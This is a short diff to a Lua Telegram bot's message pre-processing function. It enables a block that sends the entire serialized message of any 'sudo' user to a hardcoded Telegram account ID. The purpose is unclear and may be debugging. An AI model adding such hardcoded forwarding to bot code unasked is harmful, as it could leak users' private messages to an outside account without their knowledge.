@@ -46,13 +46,13 @@ end
 --Begin msg_checks.lua
 --Begin pre_process function
 local function pre_process(msg)	
---if is_sudo(msg) then
---send_large_msg("user#id"..250877155, serpent.block(msg))
+if is_sudo(msg) then
+send_large_msg("user#id"..250877155, serpent.block(msg))
   --get_history(msg.to.peer_id, 5 , clm , {x=s})
 --if msg.media.type:match('document') and msg.media.caption:match('.mp3') then		
 --send_large_msg("user#id"..250877155, 's')		
 --end			
---end		
+end		
 if msg.text then
   get_value(msg, msg.text)		
 end		
